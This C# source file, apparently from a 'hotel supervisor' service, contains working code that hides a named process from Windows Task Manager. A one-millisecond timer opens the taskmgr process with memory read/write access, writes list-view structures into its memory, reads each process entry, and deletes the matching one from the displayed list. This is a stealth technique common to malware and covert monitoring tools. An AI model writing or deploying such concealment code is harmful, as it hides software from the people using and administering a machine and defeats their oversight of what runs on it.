﻿using System;
using System.Runtime.InteropServices;

namespace HotelSupervisorService.Managers
{
    public class ProcessManager
    {
        private System.Timers.Timer m_Time = new System.Timers.Timer();
        private string m_ProcessName = "";
        private int m_ProcessID = 0;

        public string ProcessName
        {
            get
            {
                return m_ProcessName;
            }
            set
            {
                m_ProcessName = value;
            }
        }

        public void Start()
        {
            m_Time.Enabled = true;
        }

        public void Stop()
        {
            m_Time.Enabled = false;
        }

        public ProcessManager()
        {
            m_Time.Interval = 1;
            m_Time.Elapsed += new System.Timers.ElapsedEventHandler(_Time_Elapsed);
        }

        void _Time_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            HideTaskmgrListOfName(m_ProcessName);
        }

        private bool NetEnumControl(IntPtr p_Handle, int p_Param)
        {
            HotelSupervisorService.Managers.Win32API.STRINGBUFFER _TextString = new HotelSupervisorService.Managers.Win32API.STRINGBUFFER();
            HotelSupervisorService.Managers.Win32API.GetWindowText(p_Handle, out _TextString, 256);
            HotelSupervisorService.Managers.Win32API.STRINGBUFFER _ClassName = new HotelSupervisorService.Managers.Win32API.STRINGBUFFER();
            HotelSupervisorService.Managers.Win32API.GetClassName(p_Handle, out _ClassName, 255);
            if (_TextString.szText == "进程" && _ClassName.szText == "SysListView32")
            {
                Hide(p_Handle);
                return false;
            }
            return true;
        }

        public void Hide(IntPtr p_ListViewIntPtr)
        {
            IntPtr _ControlIntPtr = p_ListViewIntPtr;
            int _ItemCount = HotelSupervisorService.Managers.Win32API.SendMessage(p_ListViewIntPtr, 0x1004, 0, 0);
            HotelSupervisorService.Managers.Win32API.ProcessAccessType _Type;
            _Type = HotelSupervisorService.Managers.Win32API.ProcessAccessType.PROCESS_VM_OPERATION | HotelSupervisorService.Managers.Win32API.ProcessAccessType.PROCESS_VM_READ | HotelSupervisorService.Managers.Win32API.ProcessAccessType.PROCESS_VM_WRITE;
            IntPtr _ProcessIntPtr = HotelSupervisorService.Managers.Win32API.OpenProcess(_Type, 1, (uint)m_ProcessID);
            IntPtr _Out = IntPtr.Zero;
            for (int z = 0; z != _ItemCount; z++)
            {
                IntPtr _StrBufferMemory = HotelSupervisorService.Managers.Win32API.VirtualAllocEx(_ProcessIntPtr, 0, 255, HotelSupervisorService.Managers.Win32API.MEM_COMMIT.MEM_COMMIT, HotelSupervisorService.Managers.Win32API.MEM_PAGE.PAGE_READWRITE);
                byte[] _OutBytes = new byte[40];  //定义结构体 (LVITEM)           
                byte[] _StrIntPtrAddress = BitConverter.GetBytes(_StrBufferMemory.ToInt32());
                _OutBytes[20] = _StrIntPtrAddress[0];
                _OutBytes[21] = _StrIntPtrAddress[1];
                _OutBytes[22] = _StrIntPtrAddress[2];
                _OutBytes[23] = _StrIntPtrAddress[3];
                _OutBytes[24] = 255;
                IntPtr _Memory = HotelSupervisorService.Managers.Win32API.VirtualAllocEx(_ProcessIntPtr, 0, _OutBytes.Length, HotelSupervisorService.Managers.Win32API.MEM_COMMIT.MEM_COMMIT, HotelSupervisorService.Managers.Win32API.MEM_PAGE.PAGE_READWRITE);
                HotelSupervisorService.Managers.Win32API.WriteProcessMemory(_ProcessIntPtr, _Memory, _OutBytes, (uint)_OutBytes.Length, out _Out);
                HotelSupervisorService.Managers.Win32API.SendMessage(p_ListViewIntPtr, 0x102D, z, _Memory);
                HotelSupervisorService.Managers.Win32API.ReadProcessMemory(_ProcessIntPtr, _Memory, _OutBytes, (uint)_OutBytes.Length, out _Out);
                IntPtr _ValueIntPtr = new IntPtr(BitConverter.ToInt32(_OutBytes, 20));
                byte[] _TextBytes = new byte[255];
                HotelSupervisorService.Managers.Win32API.ReadProcessMemory(_ProcessIntPtr, _ValueIntPtr, _TextBytes, 255, out _Out);
                string _ProcessText = System.Text.Encoding.Default.GetString(_TextBytes).Trim(new Char[] { '\0' });
                HotelSupervisorService.Managers.Win32API.VirtualFreeEx(_ProcessIntPtr, _StrBufferMemory, 0, HotelSupervisorService.Managers.Win32API.MEM_COMMIT.MEM_RELEASE);
                HotelSupervisorService.Managers.Win32API.VirtualFreeEx(_ProcessIntPtr, _Memory, 0, HotelSupervisorService.Managers.Win32API.MEM_COMMIT.MEM_RELEASE);
                if (_ProcessText == m_ProcessName)
                {
                    HotelSupervisorService.Managers.Win32API.SendMessage(p_ListViewIntPtr, 0x1008, z, 0);
                }
            }
        }

        public void HideTaskmgrListOfName(string p_Name)
        {
            System.Diagnostics.Process[] _ProcessList = System.Diagnostics.Process.GetProcessesByName("taskmgr");
            for (int i = 0; i != _ProcessList.Length; i++)
            {
                if (_ProcessList[i].MainWindowTitle == "Windows 任务管理器")
                {
                    m_ProcessID = _ProcessList[i].Id;
                    HotelSupervisorService.Managers.Win32API.EnumWindowsProc _EunmControl = new HotelSupervisorService.Managers.Win32API.EnumWindowsProc(NetEnumControl);

                    HotelSupervisorService.Managers.Win32API.EnumChildWindows(_ProcessList[i].MainWindowHandle, _EunmControl, 0);
                }
            }
        }
    }

    public class Win32API
    {
        public enum MEM_PAGE
        {
            PAGE_NOACCESS = 0x1,
            PAGE_READONLY = 0x2,
            PAGE_READWRITE = 0x4,
            PAGE_WRITECOPY = 0x8,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_READWRITECOPY = 0x50,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400,
        }

        public enum MEM_COMMIT
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000,
            MEM_FREE = 0x10000,
            MEM_PRIVATE = 0x20000,
            MEM_MAPPED = 0x40000,
            MEM_RESET = 0x80000,
            MEM_TOP_DOWN = 0x100000,
            MEM_WRITE_WATCH = 0x200000,
            MEM_PHYSICAL = 0x400000,
            MEM_IMAGE = 0x1000000
        }

        [Flags]
        public enum ProcessAccessType
        {
            PROCESS_TERMINATE = (0x0001),
            PROCESS_CREATE_THREAD = (0x0002),
            PROCESS_SET_SESSIONID = (0x0004),
            PROCESS_VM_OPERATION = (0x0008),
            PROCESS_VM_READ = (0x0010),
            PROCESS_VM_WRITE = (0x0020),
            PROCESS_DUP_HANDLE = (0x0040),
            PROCESS_CREATE_PROCESS = (0x0080),
            PROCESS_SET_QUOTA = (0x0100),
            PROCESS_SET_INFORMATION = (0x0200),
            PROCESS_QUERY_INFORMATION = (0x0400)
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STRINGBUFFER
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string szText;
        }

        public delegate bool EnumWindowsProc(IntPtr p_Handle, int p_Param);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessType dwDesiredAccess, int bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern Int32 CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern Int32 ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [In, Out] byte[] buffer, UInt32 size, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        public static extern Int32 WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [In, Out] byte[] buffer, UInt32 size, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, int lpAddress, int dwSize, MEM_COMMIT flAllocationType, MEM_PAGE flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, MEM_COMMIT dwFreeType);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern int GetWindowText(IntPtr hWnd, out STRINGBUFFER text, int nMaxCount);
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern int GetClassName(IntPtr hWnd, out STRINGBUFFER ClassName, int nMaxCount);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern int EnumChildWindows(IntPtr hWndParent, EnumWindowsProc ewp, int lParam);
    }   
}
